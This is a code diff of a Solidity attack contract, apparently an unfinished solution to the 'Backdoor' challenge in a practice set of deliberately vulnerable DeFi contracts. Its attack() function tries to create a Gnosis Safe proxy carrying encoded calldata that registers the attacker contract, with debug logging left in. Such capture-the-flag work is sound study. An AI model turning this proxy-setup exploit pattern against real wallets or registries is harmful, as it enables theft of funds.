@@ -4,7 +4,7 @@ pragma solidity ^0.8.0;
 
 import "../backdoor/WalletRegistry.sol";
 import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
-import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";
+import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
 import "../DamnValuableToken.sol";
 
 import "hardhat/console.sol";
@@ -12,8 +12,9 @@ import "hardhat/console.sol";
 contract AttackBackdoor {
     DamnValuableToken token;
     WalletRegistry registry;
-    GnosisSafe wallet;
-    IProxyCreationCallback proxyCreation;
+    GnosisSafe masterCopy;
+    GnosisSafeProxyFactory proxyCreation;
+    GnosisSafe contractWallet;
 
     constructor(
         address _token,
@@ -23,11 +24,21 @@ contract AttackBackdoor {
     ) {
         token = DamnValuableToken(_token);
         registry = WalletRegistry(_registry);
-        wallet = GnosisSafe(payable(_wallet));
-        proxyCreation = IProxyCreationCallback(_proxyCreation);
+        masterCopy = GnosisSafe(payable(_wallet));
+        proxyCreation = GnosisSafeProxyFactory(_proxyCreation);
+        contractWallet = new GnosisSafe();
     }
 
     function attack() public {
-        console.log(address(wallet));
+        console.log(
+            abi
+                .encodeWithSignature("addBeneficiary(address)", address(this))
+                .length
+        );
+        proxyCreation.createProxy(
+            address(masterCopy),
+            abi.encodeWithSignature("addBeneficiary(address)", address(this))
+        );
+        console.log("Checking");
     }
 }
